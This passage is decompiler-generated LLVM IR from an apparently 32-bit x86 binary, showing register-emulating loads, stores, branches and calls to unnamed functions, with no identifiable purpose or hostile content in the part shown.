  %v2_804dec8 = call i32 @function_80512f0(i8 0)
  store i32 %v2_804dec8, i32* %eax.global-to-local, align 4
  %v0_804decd = load i32, i32* @esp, align 4
  %v1_804decd = inttoptr i32 %v0_804decd to i32*
  store i32 7, i32* %v1_804decd, align 4
  %v2_804ded4 = call i32 @function_80512f0(i8 0)
  store i32 %v2_804ded4, i32* %eax.global-to-local, align 4
  %v0_804ded9 = load i32, i32* @esp, align 4
  %v1_804ded9 = inttoptr i32 %v0_804ded9 to i32*
  %v3_804ded9 = add i32 %v0_804ded9, 4
  %v1_804deda = inttoptr i32 %v3_804ded9 to i32*
  %v2_804deda = load i32, i32* %v1_804deda, align 4
  store i32 %v2_804deda, i32* @ebx, align 4
  store i32 0, i32* %v1_804deda, align 4
  store i32 6, i32* %v1_804ded9, align 4
  %v3_804dedf = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804dedf, i32* %eax.global-to-local, align 4
  %v0_804dee4 = load i32, i32* @esp, align 4
  %v1_804dee4 = inttoptr i32 %v0_804dee4 to i32*
  %v3_804dee4 = add i32 %v0_804dee4, 4
  %v1_804dee5 = inttoptr i32 %v3_804dee4 to i32*
  store i32 %v3_804dedf, i32* %v1_804dee5, align 4
  %v1_804dee7 = add i32 %v0_804dee4, 8328
  store i32 %v1_804dee7, i32* %eax.global-to-local, align 4
  store i32 %v1_804dee7, i32* %v1_804dee4, align 4
  %v3_804deef = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804deef, i32* %eax.global-to-local, align 4
  %v0_804def4 = load i32, i32* @esp, align 4
  %v1_804def4 = add i32 %v0_804def4, 8328
  %v1_804defb = inttoptr i32 %v0_804def4 to i32*
  %v3_804defb = add i32 %v0_804def4, 4
  %v2_804defc = add i32 %v1_804def4, %v3_804deef
  store i32 %v2_804defc, i32* @esi, align 4
  %v1_804defe = inttoptr i32 %v3_804defb to i32*
  %v2_804defe = load i32, i32* %v1_804defe, align 4
  store i32 %v2_804defe, i32* @ebx, align 4
  %v0_804deff = load i32, i32* @edi, align 4
  store i32 %v0_804deff, i32* %v1_804defe, align 4
  %v0_804df00 = load i32, i32* @esi, align 4
  store i32 %v0_804df00, i32* %v1_804defb, align 4
  %v3_804df01 = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df01, i32* %eax.global-to-local, align 4
  store i32 %v3_804df01, i32* @ebx, align 4
  %v0_804df08 = load i32, i32* @esp, align 4
  %v1_804df08 = inttoptr i32 %v0_804df08 to i32*
  %v2_804df08 = load i32, i32* %v1_804df08, align 4
  store i32 %v2_804df08, i32* %eax.global-to-local, align 4
  %v3_804df08 = add i32 %v0_804df08, 4
  %v1_804df09 = inttoptr i32 %v3_804df08 to i32*
  store i32 0, i32* %v1_804df09, align 4
  store i32 7, i32* %v1_804df08, align 4
  %v3_804df0e = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804df0e, i32* %eax.global-to-local, align 4
  %v0_804df13 = load i32, i32* @esp, align 4
  %v1_804df13 = inttoptr i32 %v0_804df13 to i32*
  %v3_804df13 = add i32 %v0_804df13, 4
  %v1_804df14 = inttoptr i32 %v3_804df13 to i32*
  store i32 %v3_804df0e, i32* %v1_804df14, align 4
  %v0_804df16 = load i32, i32* @esi, align 4
  %v1_804df16 = load i32, i32* @ebx, align 4
  %v2_804df16 = add i32 %v1_804df16, %v0_804df16
  store i32 %v2_804df16, i32* %eax.global-to-local, align 4
  store i32 %v2_804df16, i32* %v1_804df13, align 4
  %v3_804df1a = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df1a, i32* %eax.global-to-local, align 4
  %v0_804df1f = load i32, i32* @esp, align 4
  %v1_804df1f = inttoptr i32 %v0_804df1f to i32*
  %v3_804df1f = add i32 %v0_804df1f, 4
  %v1_804df20 = inttoptr i32 %v3_804df1f to i32*
  %v2_804df20 = load i32, i32* %v1_804df20, align 4
  store i32 %v2_804df20, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804df20, align 4
  store i32 6, i32* %v1_804df1f, align 4
  %v3_804df25 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804df25, i32* %eax.global-to-local, align 4
  %v0_804df2a = load i32, i32* @esp, align 4
  %v1_804df2a = inttoptr i32 %v0_804df2a to i32*
  %v3_804df2a = add i32 %v0_804df2a, 4
  %v1_804df2b = inttoptr i32 %v3_804df2a to i32*
  %v2_804df2b = load i32, i32* %v1_804df2b, align 4
  store i32 %v2_804df2b, i32* @ebx, align 4
  store i32 %v3_804df25, i32* %v1_804df2b, align 4
  %v1_804df2d = add i32 %v0_804df2a, 8264
  store i32 %v1_804df2d, i32* %eax.global-to-local, align 4
  store i32 %v1_804df2d, i32* %v1_804df2a, align 4
  %v3_804df35 = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df35, i32* %eax.global-to-local, align 4
  %v0_804df3a = load i32, i32* @esp, align 4
  %v1_804df3a = add i32 %v3_804df35, 8264
  %v2_804df41 = add i32 %v1_804df3a, %v0_804df3a
  store i32 %v2_804df41, i32* @esi, align 4
  %v1_804df43 = inttoptr i32 %v0_804df3a to i32*
  %v2_804df43 = load i32, i32* %v1_804df43, align 4
  store i32 %v2_804df43, i32* %eax.global-to-local, align 4
  %v3_804df43 = add i32 %v0_804df3a, 4
  %v1_804df44 = inttoptr i32 %v3_804df43 to i32*
  %v0_804df45 = load i32, i32* @edi, align 4
  store i32 %v0_804df45, i32* %v1_804df44, align 4
  %v0_804df46 = load i32, i32* @esi, align 4
  store i32 %v0_804df46, i32* %v1_804df43, align 4
  %v3_804df47 = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df47, i32* %eax.global-to-local, align 4
  %v0_804df4c = load i32, i32* @esp, align 4
  %v1_804df4c = inttoptr i32 %v0_804df4c to i32*
  %v3_804df4c = add i32 %v0_804df4c, 4
  %v1_804df4d = inttoptr i32 %v3_804df4c to i32*
  store i32 %v3_804df47, i32* @ebx, align 4
  store i32 0, i32* %v1_804df4d, align 4
  store i32 11, i32* %v1_804df4c, align 4
  %v3_804df54 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804df54, i32* %eax.global-to-local, align 4
  %v0_804df59 = load i32, i32* @esp, align 4
  %v1_804df59 = inttoptr i32 %v0_804df59 to i32*
  %v3_804df59 = add i32 %v0_804df59, 4
  %v1_804df5a = inttoptr i32 %v3_804df59 to i32*
  store i32 %v3_804df54, i32* %v1_804df5a, align 4
  %v0_804df5c = load i32, i32* @esi, align 4
  %v1_804df5c = load i32, i32* @ebx, align 4
  %v2_804df5c = add i32 %v1_804df5c, %v0_804df5c
  store i32 %v2_804df5c, i32* %eax.global-to-local, align 4
  store i32 %v2_804df5c, i32* %v1_804df59, align 4
  %v3_804df60 = call i32 @function_8051c60(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df60, i32* %eax.global-to-local, align 4
  %v0_804df65 = load i32, i32* @esp, align 4
  %v1_804df65 = inttoptr i32 %v0_804df65 to i32*
  store i32 6, i32* %v1_804df65, align 4
  %v2_804df6c = call i32 @function_8051270(i8 0)
  store i32 %v2_804df6c, i32* %eax.global-to-local, align 4
  %v0_804df71 = load i32, i32* @esp, align 4
  %v1_804df71 = inttoptr i32 %v0_804df71 to i32*
  store i32 7, i32* %v1_804df71, align 4
  %v2_804df78 = call i32 @function_8051270(i8 0)
  %v0_804df7d = load i32, i32* @esp, align 4
  %v1_804df80 = add i32 %v0_804df7d, 8
  %v2_804df80 = inttoptr i32 %v1_804df80 to i32*
  store i32 4095, i32* %v2_804df80, align 4
  %v1_804df85 = add i32 %v0_804df7d, 4168
  store i32 %v1_804df85, i32* @edi, align 4
  %v2_804df8c = add i32 %v0_804df7d, 4
  %v3_804df8c = inttoptr i32 %v2_804df8c to i32*
  store i32 %v1_804df85, i32* %v3_804df8c, align 4
  %v1_804df8d = add i32 %v0_804df7d, 8328
  store i32 %v1_804df8d, i32* %eax.global-to-local, align 4
  %v3_804df94 = inttoptr i32 %v0_804df7d to i32*
  store i32 %v1_804df8d, i32* %v3_804df94, align 4
  %v4_804df95 = call i32 @function_80523b2(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804df95, i32* %eax.global-to-local, align 4
  %v0_804df9a = load i32, i32* @esp, align 4
  %v1_804df9a = add i32 %v0_804df9a, 16
  store i32 %v4_804df95, i32* @ebx, align 4
  %v10_804df9f = icmp eq i32 %v4_804df95, -1
  br i1 %v10_804df9f, label %dec_label_pc_804e0c7, label %dec_label_pc_804dfa8

dec_label_pc_804dfa8:                             ; preds = %dec_label_pc_804deb3
  %v2_804dfa8 = add i32 %v4_804df95, 4152
  %v3_804dfa8 = add i32 %v2_804dfa8, %v1_804df9a
  %v4_804dfa8 = inttoptr i32 %v3_804dfa8 to i8*
  store i8 0, i8* %v4_804dfa8, align 1
  %v0_804dfb0 = load i32, i32* @esp, align 4
  %v1_804dfb3 = add i32 %v0_804dfb0, -16
  %v2_804dfb3 = inttoptr i32 %v1_804dfb3 to i32*
  store i32 10, i32* %v2_804dfb3, align 4
  %v2_804dfb5 = call i32 @function_80512f0(i8 0)
  store i32 %v2_804dfb5, i32* %eax.global-to-local, align 4
  %v0_804dfba = load i32, i32* @esp, align 4
  %v1_804dfba = inttoptr i32 %v0_804dfba to i32*
  %v3_804dfba = add i32 %v0_804dfba, 4
  %v1_804dfbb = inttoptr i32 %v3_804dfba to i32*
  %v2_804dfbb = load i32, i32* %v1_804dfbb, align 4
  store i32 %v2_804dfbb, i32* @esi, align 4
  store i32 0, i32* %v1_804dfbb, align 4
  store i32 10, i32* %v1_804dfba, align 4
  %v3_804dfc0 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  %v0_804dfc5 = load i32, i32* @esp, align 4
  %v2_804dfc8 = add i32 %v0_804dfc5, 8
  %v3_804dfc8 = inttoptr i32 %v2_804dfc8 to i32*
  store i32 %v3_804dfc0, i32* %v3_804dfc8, align 4
  %v0_804dfc9 = load i32, i32* @ebx, align 4
  %v1_804dfc9 = add i32 %v0_804dfc9, -1
  store i32 %v1_804dfc9, i32* %eax.global-to-local, align 4
  %v2_804dfcc = add i32 %v0_804dfc5, 4
  %v3_804dfcc = inttoptr i32 %v2_804dfcc to i32*
  store i32 %v1_804dfc9, i32* %v3_804dfcc, align 4
  %v1_804dfcd = add i32 %v0_804dfc5, 4168
  store i32 %v1_804dfcd, i32* @edi, align 4
  %v3_804dfd4 = inttoptr i32 %v0_804dfc5 to i32*
  store i32 %v1_804dfcd, i32* %v3_804dfd4, align 4
  %v4_804dfd5 = call i32 @function_8051f30(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804dfda = load i32, i32* @esp, align 4
  %v1_804dfdd = add i32 %v4_804dfd5, 1
  %v8_804dfdd = icmp eq i32 %v1_804dfdd, 0
  store i32 %v1_804dfdd, i32* %eax.global-to-local, align 4
  br i1 %v8_804dfdd, label %dec_label_pc_804dffd, label %dec_label_pc_804dfe0

dec_label_pc_804dfe0:                             ; preds = %dec_label_pc_804dfa8
  %v1_804dfe3 = add i32 %v0_804dfda, 4168
  store i32 %v1_804dfe3, i32* %eax.global-to-local, align 4
  %v3_804dfea = inttoptr i32 %v0_804dfda to i32*
  store i32 %v1_804dfe3, i32* %v3_804dfea, align 4
  %v0_804dfeb = call i32 @function_80524d0()
  store i32 %v0_804dfeb, i32* %eax.global-to-local, align 4
  %v0_804dff0 = load i32, i32* @esp, align 4
  %v1_804dff0 = inttoptr i32 %v0_804dff0 to i32*
  %v2_804dff0 = load i32, i32* %v1_804dff0, align 4
  store i32 %v2_804dff0, i32* %eax.global-to-local, align 4
  %v3_804dff0 = add i32 %v0_804dff0, 4
  %v1_804dff1 = inttoptr i32 %v3_804dff0 to i32*
  store i32 9, i32* %v1_804dff1, align 4
  %v0_804dff4 = load i32, i32* @ebp, align 4
  store i32 %v0_804dff4, i32* %v1_804dff0, align 4
  %v4_804dff5 = call i32 @function_80522c0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dff5, i32* %eax.global-to-local, align 4
  %v0_804dffa = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dffd

dec_label_pc_804dffd:                             ; preds = %dec_label_pc_804dfa8, %dec_label_pc_804dfe0
  %v0_804dffd.in = phi i32 [ %v0_804dfda, %dec_label_pc_804dfa8 ], [ %v0_804dffa, %dec_label_pc_804dfe0 ]
  %v2_804e000 = inttoptr i32 %v0_804dffd.in to i32*
  store i32 10, i32* %v2_804e000, align 4
  %v2_804e002 = call i32 @function_8051270(i8 0)
  store i32 %v2_804e002, i32* %eax.global-to-local, align 4
  %v0_804e007 = call i32 @function_8052235()
  store i32 %v0_804e007, i32* %eax.global-to-local, align 4
  %v0_804e00c = load i32, i32* @esp, align 4
  %v1_804e00c = add i32 %v0_804e00c, 16
  %v0_804e00f = load i32, i32* @ebp, align 4
  %v12_804e00f = icmp eq i32 %v0_804e00f, %v0_804e007
  br i1 %v12_804e00f, label %dec_label_pc_804e038, label %dec_label_pc_804e013

dec_label_pc_804e013:                             ; preds = %dec_label_pc_804dffd
  %v0_804e013 = call i32 @function_805225b()
  store i32 %v0_804e013, i32* %eax.global-to-local, align 4
  %v0_804e018 = load i32, i32* @ebp, align 4
  %v12_804e018 = icmp eq i32 %v0_804e018, %v0_804e013
  %v0_804e03a.pre = load i32, i32* @esp, align 4
  br i1 %v12_804e018, label %dec_label_pc_804e038, label %dec_label_pc_804e01c

dec_label_pc_804e01c:                             ; preds = %dec_label_pc_804e013
  %v2_804e01c = add i32 %v0_804e03a.pre, -4
  %v3_804e01c = inttoptr i32 %v2_804e01c to i32*
  store i32 %v0_804e013, i32* %v3_804e01c, align 4
  %v2_804e01d = add i32 %v0_804e03a.pre, -8
  %v3_804e01d = inttoptr i32 %v2_804e01d to i32*
  store i32 %v0_804e013, i32* %v3_804e01d, align 4
  %v0_804e01e = load i32, i32* @global_var_8056940.22, align 64
  store i32 %v0_804e01e, i32* %eax.global-to-local, align 4
  %v2_804e023 = add i32 %v0_804e03a.pre, -12
  %v3_804e023 = inttoptr i32 %v2_804e023 to i32*
  store i32 %v0_804e01e, i32* %v3_804e023, align 4
  %v1_804e024 = add i32 %v0_804e03a.pre, 4152
  store i32 %v1_804e024, i32* @edi, align 4
  %v2_804e02b = add i32 %v0_804e03a.pre, -16
  %v3_804e02b = inttoptr i32 %v2_804e02b to i32*
  store i32 %v1_804e024, i32* %v3_804e02b, align 4
  %v0_804e02c = call i32 @function_8051fb0()
  store i32 %v0_804e02c, i32* %eax.global-to-local, align 4
  %v0_804e031 = load i32, i32* @esp, align 4
  %v3_804e034 = trunc i32 %v0_804e02c to i8
  %v4_804e034 = icmp eq i8 %v3_804e034, 0
  br i1 %v4_804e034, label %dec_label_pc_804e093, label %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge

dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge: ; preds = %dec_label_pc_804e01c
  %v1_804e031 = add i32 %v0_804e031, 16
  %v0_804e038.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804e038

dec_label_pc_804e038:                             ; preds = %dec_label_pc_804e013, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge, %dec_label_pc_804dffd
  %v0_804e03a = phi i32 [ %v1_804e031, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge ], [ %v1_804e00c, %dec_label_pc_804dffd ], [ %v0_804e03a.pre, %dec_label_pc_804e013 ]
  %v0_804e038 = phi i32 [ %v0_804e038.pre, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge ], [ %v0_804e007, %dec_label_pc_804dffd ], [ %v0_804e013, %dec_label_pc_804e013 ]
  store i32 %v0_804e038, i32* @esi, align 4
  %v1_804e03a = add i32 %v0_804e03a, 8
  %v2_804e03a = inttoptr i32 %v1_804e03a to i32*
  %v3_804e03a = load i32, i32* %v2_804e03a, align 4
  store i32 %v3_804e03a, i32* @ebx, align 4
  br label %dec_label_pc_804de50

dec_label_pc_804e043:                             ; preds = %dec_label_pc_804de50
  %v1_804e046 = add i32 %v0_804de5d, 32
  %v2_804e046 = inttoptr i32 %v1_804e046 to i32*
  %v3_804e046 = load i32, i32* %v2_804e046, align 4
  store i32 %v3_804e046, i32* @eax, align 4
  %v3_804e04a = inttoptr i32 %v0_804de5d to i32*
  store i32 %v3_804e046, i32* %v3_804e04a, align 4
  %v0_804e04b = call i32 @function_8052534()
  store i32 %v0_804e04b, i32* %eax.global-to-local, align 4
  %v0_804e050 = load i32, i32* @esp, align 4
  %v1_804e050 = add i32 %v0_804e050, 16
  br label %dec_label_pc_804de10

dec_label_pc_804e058:                             ; preds = %dec_label_pc_804de92
  %v0_804e058 = load i32, i32* @ebp, align 4
  %v7_804e05e = icmp sgt i32 %v0_804e058, 400
  br i1 %v7_804e05e, label %dec_label_pc_804e064, label %dec_label_pc_804de50

dec_label_pc_804e064:                             ; preds = %dec_label_pc_804e058
  store i32 -858993459, i32* %eax.global-to-local, align 4
  %v1_804e069 = add i32 %v0_804de9e, 28
  %v2_804e069 = inttoptr i32 %v1_804e069 to i32*
  %v3_804e069 = load i32, i32* %v2_804e069, align 4
  %v10_804e069 = udiv i32 %v3_804e069, 2
  store i32 %v10_804e069, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804e077 = load i32, i32* %v2_804e069, align 4
  %v15_804e077 = icmp eq i32 %v3_804e077, 0
  %v1_804e07b = icmp eq i1 %v15_804e077, false
  br i1 %v1_804e07b, label %dec_label_pc_804de50, label %dec_label_pc_804e081

dec_label_pc_804e081:                             ; preds = %dec_label_pc_804e064
  %v2_804e084 = inttoptr i32 %v0_804de9e to i32*
  store i32 1, i32* %v2_804e084, align 4
  %v1_804e086 = call i32 @function_8053d90(i32 0)
  store i32 %v1_804e086, i32* %eax.global-to-local, align 4
  %v0_804e08b = load i32, i32* @esp, align 4
  %v1_804e08b = add i32 %v0_804e08b, 16
  br label %dec_label_pc_804de50

dec_label_pc_804e093:                             ; preds = %dec_label_pc_804e01c
  %v2_804e093 = add i32 %v0_804e031, 12
  %v3_804e093 = inttoptr i32 %v2_804e093 to i32*
  store i32 %v0_804e02c, i32* %v3_804e093, align 4
  %v2_804e094 = add i32 %v0_804e031, 8
  %v3_804e094 = inttoptr i32 %v2_804e094 to i32*
  store i32 %v0_804e02c, i32* %v3_804e094, align 4
  %v1_804e095 = add i32 %v0_804e031, 4
  %v2_804e095 = inttoptr i32 %v1_804e095 to i32*
  store i32 0, i32* %v2_804e095, align 4
  %v1_804e097 = add i32 %v0_804e031, 4168
  store i32 %v1_804e097, i32* %eax.global-to-local, align 4
  %v3_804e09e = inttoptr i32 %v0_804e031 to i32*
  store i32 %v1_804e097, i32* %v3_804e09e, align 4
  %v3_804e09f = call i32 @function_80522f2(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e09f, i32* %eax.global-to-local, align 4
  %v0_804e0a4 = load i32, i32* @esp, align 4
  store i32 %v3_804e09f, i32* @ebx, align 4
  %v10_804e0a9 = icmp eq i32 %v3_804e09f, -1
  %v1_804e0ac = icmp eq i1 %v10_804e0a9, false
  br i1 %v1_804e0ac, label %dec_label_pc_804e0bb, label %dec_label_pc_804e0ae

dec_label_pc_804e0ae:                             ; preds = %dec_label_pc_804e093
  %v0_804e0ae = load i32, i32* @edi, align 4
  %v2_804e0ae = add i32 %v0_804e0a4, 12
  %v3_804e0ae = inttoptr i32 %v2_804e0ae to i32*
  store i32 %v0_804e0ae, i32* %v3_804e0ae, align 4
  %v0_804e0af = load i32, i32* @edi, align 4
  %v2_804e0af = add i32 %v0_804e0a4, 8
  %v3_804e0af = inttoptr i32 %v2_804e0af to i32*
  store i32 %v0_804e0af, i32* %v3_804e0af, align 4
  %v1_804e0b0 = add i32 %v0_804e0a4, 4
  %v2_804e0b0 = inttoptr i32 %v1_804e0b0 to i32*
  store i32 9, i32* %v2_804e0b0, align 4
  %v0_804e0b2 = load i32, i32* @ebp, align 4
  %v3_804e0b2 = inttoptr i32 %v0_804e0a4 to i32*
  store i32 %v0_804e0b2, i32* %v3_804e0b2, align 4
  %v4_804e0b3 = call i32 @function_80522c0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e0b3, i32* %eax.global-to-local, align 4
  %v0_804e0b8 = load i32, i32* @esp, align 4
  %v0_804e0be.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e0bb

dec_label_pc_804e0bb:                             ; preds = %dec_label_pc_804e093, %dec_label_pc_804e0ae
  %v0_804e0be = phi i32 [ %v3_804e09f, %dec_label_pc_804e093 ], [ %v0_804e0be.pre, %dec_label_pc_804e0ae ]
  %v0_804e0bb.in = phi i32 [ %v0_804e0a4, %dec_label_pc_804e093 ], [ %v0_804e0b8, %dec_label_pc_804e0ae ]
  %v3_804e0be = inttoptr i32 %v0_804e0bb.in to i32*
  store i32 %v0_804e0be, i32* %v3_804e0be, align 4
  %v1_804e0bf = call i32 @function_80521e1(i32 0)
  store i32 %v1_804e0bf, i32* %eax.global-to-local, align 4
  %v0_804e0c4 = load i32, i32* @esp, align 4
  %v1_804e0c4 = add i32 %v0_804e0c4, 16
  br label %dec_label_pc_804e0c7

dec_label_pc_804e0c7:                             ; preds = %dec_label_pc_804deb3, %dec_label_pc_804e0bb
  %v1_804e0c7 = phi i32 [ %v1_804df9a, %dec_label_pc_804deb3 ], [ %v1_804e0c4, %dec_label_pc_804e0bb ]
  %v0_804e0c7 = load i32, i32* @esi, align 4
  %v2_804e0c7 = add i32 %v1_804e0c7, -4
  %v3_804e0c7 = inttoptr i32 %v2_804e0c7 to i32*
  store i32 %v0_804e0c7, i32* %v3_804e0c7, align 4
  %v0_804e0c8 = load i32, i32* @esi, align 4
  %v2_804e0c8 = add i32 %v1_804e0c7, -8
  %v3_804e0c8 = inttoptr i32 %v2_804e0c8 to i32*
  store i32 %v0_804e0c8, i32* %v3_804e0c8, align 4
  %v1_804e0c9 = add i32 %v1_804e0c7, -12
  %v2_804e0c9 = inttoptr i32 %v1_804e0c9 to i32*
  store i32 0, i32* %v2_804e0c9, align 4
  %v1_804e0cb = add i32 %v1_804e0c7, 8312
  %v2_804e0d2 = add i32 %v1_804e0c7, -16
  %v3_804e0d2 = inttoptr i32 %v2_804e0d2 to i32*
  store i32 %v1_804e0cb, i32* %v3_804e0d2, align 4
  %v3_804e0d3 = call i32 @function_80522f2(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v1_804e0d8 = load i32, i32* @esp, align 4
  %v2_804e0d8 = add i32 %v1_804e0d8, 56
  %v3_804e0d8 = inttoptr i32 %v2_804e0d8 to i32*
  store i32 %v3_804e0d3, i32* %v3_804e0d8, align 4
  %v0_804e0dc = load i32, i32* @esp, align 4
  %v1_804e0df = add i32 %v3_804e0d3, 1
  %v8_804e0df = icmp eq i32 %v1_804e0df, 0
  store i32 %v1_804e0df, i32* @eax, align 4
  br i1 %v8_804e0df, label %dec_label_pc_804e31c, label %dec_label_pc_804e0e6

dec_label_pc_804e0e6:                             ; preds = %dec_label_pc_804e0c7
  %v2_804e0e9 = inttoptr i32 %v0_804e0dc to i32*
  store i32 12, i32* %v2_804e0e9, align 4
  %v2_804e0eb = call i32 @function_80512f0(i8 0)
  store i32 %v2_804e0eb, i32* %eax.global-to-local, align 4
  %v0_804e0f0 = load i32, i32* @esp, align 4
  %v1_804e0f0 = inttoptr i32 %v0_804e0f0 to i32*
  store i32 13, i32* %v1_804e0f0, align 4
  %v2_804e0f7 = call i32 @function_80512f0(i8 0)
  store i32 %v2_804e0f7, i32* %eax.global-to-local, align 4
  %v0_804e0fc = load i32, i32* @esp, align 4
  %v1_804e0fc = inttoptr i32 %v0_804e0fc to i32*
  store i32 14, i32* %v1_804e0fc, align 4
  %v2_804e103 = call i32 @function_80512f0(i8 0)
  store i32 %v2_804e103, i32* %eax.global-to-local, align 4
  %v0_804e108 = load i32, i32* @esp, align 4
  %v1_804e108 = inttoptr i32 %v0_804e108 to i32*
  store i32 15, i32* %v1_804e108, align 4
  %v2_804e10f = call i32 @function_80512f0(i8 0)
  store i32 %v2_804e10f, i32* %eax.global-to-local, align 4
  %v0_804e114 = load i32, i32* @esp, align 4
  %v1_804e114 = inttoptr i32 %v0_804e114 to i32*
  store i32 16, i32* %v1_804e114, align 4
  %v2_804e11b = call i32 @function_80512f0(i8 0)
  store i32 %v2_804e11b, i32* %eax.global-to-local, align 4
  %v0_804e120 = load i32, i32* @esp, align 4
  %v1_804e120 = inttoptr i32 %v0_804e120 to i32*
  %v3_804e120 = add i32 %v0_804e120, 4
  %v1_804e121 = inttoptr i32 %v3_804e120 to i32*
  %v1_804e122 = add i32 %v0_804e120, 8436
  store i32 %v1_804e122, i32* %eax.global-to-local, align 4
  store i32 %v1_804e122, i32* %v1_804e121, align 4
  store i32 12, i32* %v1_804e120, align 4
  %v3_804e12c = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804e12c, i32* %eax.global-to-local, align 4
  %v1_804e131 = load i32, i32* @esp, align 4
  %v2_804e131 = add i32 %v1_804e131, 52
  %v3_804e131 = inttoptr i32 %v2_804e131 to i32*
  store i32 %v3_804e12c, i32* %v3_804e131, align 4
  %v0_804e135 = load i32, i32* @esp, align 4
  %v1_804e135 = inttoptr i32 %v0_804e135 to i32*
  %v3_804e135 = add i32 %v0_804e135, 4
  %v1_804e136 = inttoptr i32 %v3_804e135 to i32*
  %v1_804e137 = add i32 %v0_804e135, 8432
  store i32 %v1_804e137, i32* %eax.global-to-local, align 4
  store i32 %v1_804e137, i32* %v1_804e136, align 4
  store i32 13, i32* %v1_804e135, align 4
  %v3_804e141 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804e141, i32* %eax.global-to-local, align 4
  %v1_804e146 = load i32, i32* @esp, align 4
  %v2_804e146 = add i32 %v1_804e146, 48
  %v3_804e146 = inttoptr i32 %v2_804e146 to i32*
  store i32 %v3_804e141, i32* %v3_804e146, align 4
  %v0_804e14a = load i32, i32* @esp, align 4
  %v1_804e14a = inttoptr i32 %v0_804e14a to i32*
  %v3_804e14a = add i32 %v0_804e14a, 4
  %v1_804e14b = inttoptr i32 %v3_804e14a to i32*
  %v2_804e14b = load i32, i32* %v1_804e14b, align 4
  store i32 %v2_804e14b, i32* @edi, align 4
  %v1_804e14c = add i32 %v0_804e14a, 8428
  store i32 %v1_804e14c, i32* %eax.global-to-local, align 4
  store i32 %v1_804e14c, i32* %v1_804e14b, align 4
  store i32 14, i32* %v1_804e14a, align 4
  %v3_804e156 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804e156, i32* %eax.global-to-local, align 4
  %v1_804e15b = load i32, i32* @esp, align 4
  %v2_804e15b = add i32 %v1_804e15b, 44
  %v3_804e15b = inttoptr i32 %v2_804e15b to i32*
  store i32 %v3_804e156, i32* %v3_804e15b, align 4
  %v0_804e15f = load i32, i32* @esp, align 4
  %v1_804e15f = inttoptr i32 %v0_804e15f to i32*
  %v3_804e15f = add i32 %v0_804e15f, 4
  %v1_804e160 = inttoptr i32 %v3_804e15f to i32*
  %v2_804e160 = load i32, i32* %v1_804e160, align 4
  store i32 %v2_804e160, i32* @ebx, align 4
  %v1_804e161 = add i32 %v0_804e15f, 8440
  store i32 %v1_804e161, i32* %eax.global-to-local, align 4
  store i32 %v1_804e161, i32* %v1_804e160, align 4
  store i32 15, i32* %v1_804e15f, align 4
  %v3_804e16b = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804e16b, i32* %eax.global-to-local, align 4
  %v1_804e170 = load i32, i32* @esp, align 4
  %v2_804e170 = add i32 %v1_804e170, 40
  %v3_804e170 = inttoptr i32 %v2_804e170 to i32*
  store i32 %v3_804e16b, i32* %v3_804e170, align 4
  %v0_804e174 = load i32, i32* @esp, align 4
  %v1_804e174 = inttoptr i32 %v0_804e174 to i32*
  %v3_804e174 = add i32 %v0_804e174, 4
  %v1_804e175 = inttoptr i32 %v3_804e174 to i32*
  %v1_804e176 = add i32 %v0_804e174, 8424
  store i32 %v1_804e176, i32* %eax.global-to-local, align 4
  store i32 %v1_804e176, i32* %v1_804e175, align 4
  store i32 16, i32* %v1_804e174, align 4
  %v3_804e180 = call i32 @function_8051240(i32 0, i32* nonnull @0)
  store i32 %v3_804e180, i32* %eax.global-to-local, align 4
  %v1_804e185 = load i32, i32* @esp, align 4
  %v2_804e185 = add i32 %v1_804e185, 36
  %v3_804e185 = inttoptr i32 %v2_804e185 to i32*
  store i32 %v3_804e180, i32* %v3_804e185, align 4
  %v0_804e189 = load i32, i32* @esp, align 4
  %v1_804e189 = add i32 %v0_804e189, 16
  %v0_804e18c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e18c

dec_label_pc_804e18c:                             ; preds = %dec_label_pc_804e288, %dec_label_pc_804e2a0.backedge, %dec_label_pc_804e297, %dec_label_pc_804e0e6
  %v1_804e18c = phi i32 [ %v1_804e189, %dec_label_pc_804e0e6 ], [ %v0_804e297, %dec_label_pc_804e297 ], [ %v0_804e297, %dec_label_pc_804e2a0.backedge ], [ %v0_804e297, %dec_label_pc_804e288 ]
